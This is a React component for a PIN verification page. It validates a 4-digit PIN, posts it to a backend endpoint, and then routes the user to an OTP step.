import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import axios from "axios";
import "../App.css";
import "../styles/email.css";
import BASE_URL from "../components/urls";
import FormErrMsg from "../components/FormErrMsg";

// Validation schema using yup
const schema = yup.object().shape({
  pin: yup
    .string()
    .matches(/^\d{4}$/i, "PIN must be 4 digits")
    .required("PIN is required"),
});

const Pin = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const [loading, setLoading] = useState(false);

  // Handle form submission
  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/pin`, data)
      .then((response) => {
        console.log(response.data);
        reset();
        navigate("/otp");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };
  return (
    <div className="email-screen">
      <div className="email-container">
        <div className="email-header">
          <div className="email-title">PIN Verification</div>
          <div className="email-subtitle">
            Enter your 4-digit PIN to verify account ownership.
          </div>
        </div>
        <div className="email-card">
          <form onSubmit={handleSubmit(submitForm)} className="email-form">
            <div className="form-group">
              <label className="email-label" htmlFor="pin">
                PIN
              </label>
              <input
                id="pin"
                type="password"
                name="pin"
                className="email-input"
                inputMode="numeric"
                maxLength={4}
                pattern="\d*"
                placeholder="Enter 4-digit PIN"
                {...register("pin")}
              />
              <FormErrMsg errors={errors} inputName="pin" />
            </div>

            <button
              type="submit"
              className="email-submit-btn"
              disabled={loading}
            >
              {loading ? "Loading..." : "Verify PIN"}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Pin;
